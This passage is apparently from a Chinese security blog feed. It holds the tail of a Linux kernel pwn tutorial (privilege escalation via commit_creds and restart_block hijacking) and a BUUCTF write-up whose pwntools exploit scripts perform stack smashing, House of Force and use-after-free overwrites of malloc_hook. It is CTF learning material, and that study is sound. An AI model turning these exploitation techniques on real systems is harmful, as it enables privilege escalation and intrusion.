&lt;sys/ioctl.h&gt;.</span><br></pre></td></tr></table></figure><p>可以看出ioctl也是一个系统调用，用于与设备通信。</p><p>第一个参数为打开设备返回的文件描述符，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。</p><blockquote><p>使用 ioctl 进行通信的原因：</p><p>操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址, 但是当访问非标准硬件设备这些系统调用显得不合适, 有时候用户模式可能需要直接访问设备。</p><p>比如，一个系统管理员可能要修改网卡的配置。现代操作系统提供了各种各样设备的支持，有一些设备可能没有被内核设计者考虑到，如此一来提供一个这样的系统调用来使用设备就变得不可能了。</p><p>为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 Ioctl 接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 Ioctl 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</p></blockquote><p>（妙啊）</p><h3 id="内核态函数调用"><a href="#内核态函数调用" class="headerlink" title="内核态函数调用"></a>内核态函数调用</h3><p>相比用户态函数，内核态的函数有了一些变化：</p><ol><li>printf变更为printk，值得注意的是printk不一定会把内容显示到终端上，<strong>但是一定在内核缓冲区里</strong>，可以通过<code>dmesg</code>查看效果</li><li>memcpy变更为copy_from_user/copy_to_user<ol><li>Copy_from_user实现了将用户空间的数据传送到内核空间</li><li>Copy_to_user实现了将内核空间的数据传送到用户空间</li></ol></li><li>malloc变更为kmalloc，内核态的内存分配函数，和malloc相似，但使用的是slab/slub分配器</li><li>free变更为kfree，同kmalloc</li></ol><p>同时，kernel负责管理进程，因此kernel也记录了进程的权限。kernel中有两个可以方便的改变权限的函数：</p><ol><li><code>int commit_creds(struct cred *new)</code></li><li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code></li></ol><p>从函数名也可以看出，执行commit_creds(prepare_kernel_cred(0))即获得root权限，0表示以0号进程作为参考准备新的credentials</p><p>执行commit_creds(prepare_kernel_cred(0))也是最常用的提权手段，两个函数的地址都可以在/proc/kallsyms中查看（较老的内核版本中是/proc/ksyms）</p><p><img src="/Users/lemon/Library/Application Support/typora-user-images/image-20210811161724893.png" alt="image-20210811161724893" style="zoom:50%;" /></p><p>一般情况下，/proc/kallsyms的内容需要root权限才能查看，若以非root权限查看将显示为0地址（emm）</p><h3 id="struct-cred-进程权限结构体"><a href="#struct-cred-进程权限结构体" class="headerlink" title="struct cred - 进程权限结构体"></a>struct cred - 进程权限结构体</h3><p>内核使用cred结构体记录进程的权限，每个进程中都有一个cred结构，这个结构保存了该进程的权限等信息（uid，gid等），如果能修改某个进程的cred，那么也就修改了这个进程的权限。结构体源码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;           <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;                   <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;                   <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;                  <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;                  <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;                  <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;                  <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;                 <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;                 <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits;            <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable;   <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;     <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;     <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;          <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;       <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;       <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">    /* keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span>      <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span>       <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span>     <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;             <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>          <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span>    <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>     <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>               <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h3 id="内核保护机制"><a href="#内核保护机制" class="headerlink" title="内核保护机制"></a>内核保护机制</h3><ol><li>smep: Supervisor Mode Execute Protection，当处理器处于ring 0模式，执行用户空间的代码会触发页错误（在arm中该保护称为PXN）。</li><li>smap: Supervisor Mode Access Protection，类似于smep，当处理器处于ring 0模式，访问用户空间的数据会发生页错误。</li><li>MMAP_MIN_ADDR: 控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。</li><li>KASLR: Kernel Address Space Layout Randomization，内核地址空间布局随机化，开启后，允许kernel image加载到VMALLOC区域的任何位置。</li></ol><p>Canary，DEP，PIE，RELRO等保护与用户态原理和作用相同。</p><h2 id="03-LKMs介绍"><a href="#03-LKMs介绍" class="headerlink" title="03. LKMs介绍"></a>03. LKMs介绍</h2><h3 id="什么是LKMs"><a href="#什么是LKMs" class="headerlink" title="什么是LKMs"></a>什么是LKMs</h3><p>LKMs (Loadable Kernel Modules)称为可加载核心模块(内核模块)， 其可以看作是运行在内核空间的可执行程序，包括：</p><ul><li>驱动程序 Device drivers<ul><li>设备驱动</li><li>文件系统驱动</li><li>……</li></ul></li><li>内核扩展模块 modules</li></ul><p>LKMs的文件格式和用户态的可执行程序相同，Linux下为ELF，Windows下为exe/dll，mac下为MACH-O，因此可以使用IDA等工具来分析内核模块。</p><p>模块可以被单独编译，但是不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户空间的进程不同。</p><p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。</p><blockquote><p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p></blockquote><p><strong>通常情况下，Kernel漏洞的发生也常见于加载的LKMs出现问题。</strong></p><h3 id="内核中的模块相关命令"><a href="#内核中的模块相关命令" class="headerlink" title="内核中的模块相关命令"></a>内核中的模块相关命令</h3><ol><li>insmod：将指定模块加载到内核中。</li><li>rmmod：从内核中卸载指定模块。</li><li>lsmod：列出已经加载的模块。</li><li>modprobe：添加或删除模块，modprobe在加载模块时会查找依赖关系。</li></ol><h3 id="file-operations-结构体"><a href="#file-operations-结构体" class="headerlink" title="file_operations 结构体"></a>file_operations 结构体</h3><p>用户进程在对设备文件进行诸如read/write操作的时候，<strong>系统调用通过设备文件的主设备号找到相应的设备驱动程序，然后读取这个数据结构相应的函数指针，接着把控制权交给该函数，这是linux的设备驱动程序工作的基本原理。</strong></p><p>内核模块程序的结构中包括一些call back回调表，对应的函数存储在一个file_operations(fop)结构体中，这也是相当重要的结构体，结构体中实现了的回调函数就会静态初始化函数地址，而未实现的函数，值为NULL。</p><p>例如：</p><div class="table-container"><table><thead><tr><th style="text-align:center">Events</th><th style="text-align:center">User functions</th><th style="text-align:center">Kernel functions</th></tr></thead><tbody><tr><td style="text-align:center">Load</td><td style="text-align:center">insmod</td><td style="text-align:center">module_init()</td></tr><tr><td style="text-align:center">Open</td><td style="text-align:center">fopen</td><td style="text-align:center">file_operations: open</td></tr><tr><td style="text-align:center">Close</td><td style="text-align:center">fread</td><td style="text-align:center">file_operations: read</td></tr><tr><td style="text-align:center">Write</td><td style="text-align:center">fwrite</td><td style="text-align:center">file_operations: write</td></tr><tr><td style="text-align:center">Close</td><td style="text-align:center">fclose</td><td style="text-align:center">file_operations: release</td></tr><tr><td style="text-align:center">Remove</td><td style="text-align:center">rmmod</td><td style="text-align:center">module_exit()</td></tr></tbody></table></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Hello world!n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Bye, cruel worldn&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">module_fops</span> =</span> </span><br><span class="line">&#123;</span><br><span class="line">    read: module_read,</span><br><span class="line">    write: module_write,</span><br><span class="line">    open: module_open,</span><br><span class="line">    release: module_release</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中，module_init/module_exit是在载入/卸载这个驱动时自动运行；而fop结构体实现了如上四个callback，冒号右侧的函数名是由开发者自己起的，在驱动程序载入内核后，其他用户程序就可以借助文件方式像进行系统调用一样调用这些函数实现所需功能。</p><h2 id="04-环境配置"><a href="#04-环境配置" class="headerlink" title="04. 环境配置"></a>04. 环境配置</h2><p>对于kernel pwn来说，题目通常会给定以下文件：</p><blockquote><p>boot.sh：一个用于启动kernel的shell脚本，多用qemu，保护措施与qemu不同的启动参数有关</p><p>bzImage：kernel binary</p><p>rootfs.cpio：文件系统映像</p></blockquote><p>qemu的启动参数：</p><ul><li>-initrd rootfs.cpio，使用rootfs.cpio作为内核启动的文件系统</li><li>-kernel bzImage，使用bzImage作为kernel映像</li><li>-cpu kvm64,+smep，设置CPU的安全选项，这里开启了smep</li><li>-m 64M，设置虚拟RAM为64M，默认为128M</li></ul><h2 id="05-Kernel-Stack-Overflow"><a href="#05-Kernel-Stack-Overflow" class="headerlink" title="05. Kernel Stack Overflow"></a>05. Kernel Stack Overflow</h2><h3 id="内核栈帧-Kernel-Stack-Layout"><a href="#内核栈帧-Kernel-Stack-Layout" class="headerlink" title="内核栈帧(Kernel Stack Layout)"></a>内核栈帧(Kernel Stack Layout)</h3><p>x86上的Linux内核堆栈的大小为4096或8192字节，取决于发行版。</p><p>内核堆栈与thread_info结构共享4k/8k的总大小，该结构包含有关当前线程的一些元数据，如include/linux/sched.h中所示</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">thread_union</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> <span class="title">thread_info</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>[THREAD_SIZE/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>thread_info结构体在x86下有如下定义（arch/x86/include/asm/thread_info.h）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exec_domain</span> *<span class="title">exec_domain</span>;</span></span><br><span class="line">    __u32      flags;</span><br><span class="line">    __u32      status;</span><br><span class="line">    __u32      cpu;</span><br><span class="line">    <span class="keyword">int</span>          preempt_count;</span><br><span class="line">    <span class="keyword">mm_segment_t</span>  addr_limit;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> <span class="title">restart_block</span>;</span></span><br><span class="line">    <span class="keyword">void</span> __user     *sysenter_return;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_32</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  previous_esp;</span><br><span class="line">    __u8      supervisor_stack[<span class="number">0</span>];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span>          uaccess_err;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>内核堆栈在内存中呈现下所示的结构</p><p><img src="https://img.lhyerror404.cn/error404/2020-03-15-061423.png" alt=""></p><p>当内核函数需要超过4k/8k的堆栈空间或者使用了长调用链以至于超出可用堆栈空间的时候，会导致堆栈溢出的发生，并且如果thread_info结构或超出更低地址处的关键内存损坏，则会导致内核崩溃。但是，如果内存对齐并且存在实际可以控制写入堆栈及其以外的数据的情况，则可能存在可利用的条件。</p><h3 id="kernel栈溢出攻击"><a href="#kernel栈溢出攻击" class="headerlink" title="kernel栈溢出攻击"></a>kernel栈溢出攻击</h3><p>我们看一看栈溢出和thread_info结构的破坏是如何导致提权的发生的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">blah</span><span class="params">(<span class="keyword">int</span> __user *vals, <span class="keyword">int</span> __user count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">int</span> big_array[count];</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; count; ++count) &#123;</span><br><span class="line">    big_array[i] = vals[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上代码使用了可变长度的数组，其大小基于攻击者的count。c99允许使用可变长的数组，并且GCC支持可变长的数组。GCC将在运行的时候简单地计算必要的大小，并适当减少堆栈指针，以在堆栈上为数组分配空间。</p><p>我们如果提供一个极大的count，则堆栈可能向下扩展到thread_info的边界之外，从而允许攻击者随后将任意值写入该结构。</p><p>我们可以利用的target为thread_info结构中的一个成员：restart_block。该成员是每个线程的结构，用于跟踪信息和参数以供重新启动系统调用。如果在sigaction(2)中指定了SA_RESTART，则被信号中断的系统调用可以中止并返回EINTR，也可以自动自行重启。在include/linux/thread_info.h中，restart_block的定义如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> (*fn)(struct restart_block *);</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">/* For futex_wait and futex_wait_requeue_pi */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; futex;</span><br><span class="line">        <span class="comment">/* For nanosleep */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; nanosleep;</span><br><span class="line">        <span class="comment">/* For poll */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; poll;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里有一个fn的函数指针，在kernel/signal.c中有如下代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE0(restart_syscall)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> *<span class="title">restart</span> =</span> &amp;current_thread_info()-&gt;restart_block;</span><br><span class="line">    <span class="keyword">return</span> restart-&gt;fn(restart);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而restart_syscall在arch/x86/kernel/syscall_table_32.S中被定义：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.<span class="keyword">long</span> sys_restart_syscall <span class="comment">/* 0 - old &quot;setup()&quot; system call, used for restarting */</span></span><br></pre></td></tr></table></figure><p>实际上它的系统调用号为0，我们可以通过以下方式从用户态中调用其功能：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">syscall(SYS_restart_syscall);</span><br></pre></td></tr></table></figure><p>这将使内核调用在restart_block结构中的函数指针。</p><p>如果我们可以破坏thread_info中的restart_block成员中的函数指针，则可以将其指向我们控制下的用户空间中的函数，通过调用sys_restart_syscall触发其执行，并提权。</p><h3 id="Linux提权思路"><a href="#Linux提权思路" class="headerlink" title="Linux提权思路"></a>Linux提权思路</h3><p>之前说过，执行commit_creds(prepare_kernel_cred(0))，可以使进程的权限提升为root，然后我们返回到用户模式，执行iret指令。</p><p>关于iret指令：</p><ul><li><p>当使用iret指令返回到相同保护级别的任务时，iret会从堆栈弹出代码段选择子及指令指针分别到CS与IP寄存器，并弹出标志寄存器内容到EFLAGS寄存器。</p></li><li><p>当使用iret指令返回到一个不同保护级别时，iret不仅会从堆栈弹出以上内容，还会弹出堆栈段选择子及堆栈指针分别到SS与SP寄存器。</p></li><li><p>栈上保存了trap frame，返回到用户模式的时候，恢复信息从以下的结构读取：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span>* eip;                <span class="comment">// instruction pointer +0</span></span><br><span class="line">    <span class="keyword">uint32_t</span> cs;              <span class="comment">// code segment    +4</span></span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;          <span class="comment">// CPU flags       +8</span></span><br><span class="line">    <span class="keyword">void</span>* esp;                <span class="comment">// stack pointer       +12</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ss;              <span class="comment">// stack segment   +16</span></span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF第三周</title>
      <link href="2021/08/05/BUUCTF%E7%AC%AC%E4%B8%89%E5%91%A8/"/>
      <url>2021/08/05/BUUCTF%E7%AC%AC%E4%B8%89%E5%91%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="wdb2018-guess"><a href="#wdb2018-guess" class="headerlink" title="wdb2018_guess"></a>wdb2018_guess</h2><p>（较易）考点：</p><ul><li>fork子进程</li><li>stack smashing</li><li>利用environ确定任意栈地址</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;Please type your guessing flag&quot;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x128</span> + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    libc_base = uu64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    environ = libc_base + libc.sym[<span class="string">&quot;__environ&quot;</span>]</span><br><span class="line">    sla(<span class="string">&#x27;Please type your guessing flag&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x128</span> + p64(environ))</span><br><span class="line">    flag = uu64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]) - <span class="number">0x168</span></span><br><span class="line">    sla(<span class="string">&quot;Please type your guessing flag&quot;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x128</span> + p64(flag))</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a>gyctf_2020_force</h2><p>（较难）考点：</p><ul><li>mmap泄露堆地址</li><li>House of Force</li><li>realloc_hook调整栈帧使og生效</li></ul><p>卡在了泄露地址这个点，学到了mmap出来的空间相邻libc的地址</p><p>house of force改top chunk的地址为-1(0xfff…)</p><p>然后无限申请，算下malloc_hook的偏移到topchunk，然后申请到附近改那两个hook</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    libc_base = add(<span class="number">0x200000</span>, <span class="string">&#x27;mmap&#x27;</span>) + <span class="number">0x201000</span> - <span class="number">0x10</span></span><br><span class="line">    echo(<span class="string">&quot;base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    one_addr = add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)) - <span class="number">0x10</span></span><br><span class="line">    size = (libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]) - (one_addr + <span class="number">0x20</span>) - <span class="number">0x40</span></span><br><span class="line">    echo(<span class="built_in">hex</span>(size))</span><br><span class="line">    add(size, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    og = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">    binsh = add(<span class="number">0x40</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x18</span> + p64(libc_base + og[<span class="number">1</span>]) + p64(libc_base + libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>] + <span class="number">0x10</span>))</span><br><span class="line">    gdba()</span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;size&quot;</span>, <span class="built_in">str</span>(<span class="number">0xdead</span>))</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="picoctf-2018-buffer-overflow-0"><a href="#picoctf-2018-buffer-overflow-0" class="headerlink" title="picoctf_2018_buffer overflow 0"></a>picoctf_2018_buffer overflow 0</h2><p>（较易）考点：</p><ul><li>栈溢出</li><li>signal调用后门函数</li></ul><p>ssh连接到服务器，运行函数通过命令行传入参数然后泄露出flag</p><h2 id="gyctf-2020-some-thing-interesting"><a href="#gyctf-2020-some-thing-interesting" class="headerlink" title="gyctf_2020_some_thing_interesting"></a>gyctf_2020_some_thing_interesting</h2><p>（中等）考点：</p><ul><li>UAF</li><li>堆布局构造unsorted bin</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sa(<span class="string">&quot;&gt; Input your code please:&quot;</span>, <span class="string">&quot;OreOOrereOOreO&quot;</span>)</span><br><span class="line">    add(<span class="number">0x30</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>),<span class="number">0x30</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>))</span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    ru(<span class="string">&quot;RE is &quot;</span>)</span><br><span class="line">    heap = uu64(io.recvuntil(<span class="string">&quot;\n&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) - <span class="number">0x80</span></span><br><span class="line">    echo(<span class="string">&quot;heap:&quot;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">&#x27;\x00&#x27;</span>, p64(heap + <span class="number">0x10</span>))</span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">    add(<span class="number">0x30</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>), <span class="number">0x30</span>, payload)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    libc_base = uu64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]) - <span class="number">88</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;libc base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)   <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;b&#x27;</span>)   <span class="comment"># 4</span></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    edit(<span class="number">4</span>, p64(<span class="number">0</span>), p64(libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] - <span class="number">0x23</span>))</span><br><span class="line">    </span><br><span class="line">    og = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">    payload = <span class="number">0x13</span> * <span class="string">&#x27;\x00&#x27;</span> + p64(libc.address + og[<span class="number">3</span>])</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add(0x50, p64(0xdeadbeef), 0x40, &#x27;hello&#x27;)</span></span><br><span class="line">    gdba()</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="mrctf2020-shellcode-revenge"><a href="#mrctf2020-shellcode-revenge" class="headerlink" title="mrctf2020_shellcode_revenge"></a>mrctf2020_shellcode_revenge</h2><p>（难）考点：</p><ul><li>部分可见字符的shellcode编写</li></ul><p>震撼我一整年</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sa(<span class="string">&quot;Show me your magic!&quot;</span>, <span 